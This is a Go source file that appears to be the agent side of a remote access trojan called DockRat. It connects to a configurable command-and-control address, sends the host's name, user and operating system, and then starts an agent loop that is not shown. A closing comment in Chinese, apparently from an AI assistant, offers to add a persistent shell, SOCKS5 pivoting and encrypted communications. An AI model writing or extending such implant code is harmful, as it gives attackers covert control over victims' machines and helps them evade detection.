package main

import (
	"encoding/json"
	"log"
	"net"
	"os"
	"runtime"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
)

func main() {
	addr := "127.0.0.1:9999"

	if len(os.Args) > 1 {
		addr = os.Args[1]
	} else if env := os.Getenv("DOCKRAT_CONNECT"); env != "" {
		addr = env
	}

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Fatalf("[-] Failed to connect to %s: %v", addr, err)
	}
	log.Printf("[+] Connected to %s", addr)

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := protocol.HandshakePayload{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
	}
	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: payloadBytes,
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Fatalf("[-] Failed to encode message: %v", err)
	}

	_, err = conn.Write(data)
	if err != nil {
		log.Fatalf("[-] Failed to send message: %v", err)
	}

	log.Println("[+] Handshake message sent")

	network.StartAgent(conn)
}

/*是否继续实现：

    🐚 持久化 shell 模式（交互式 stdin/stdout）

    🛰️ socks5 转发或端口映射

    🔐 TLS/AES 加密通信层

你可以指定想优先开发的子模块。 */
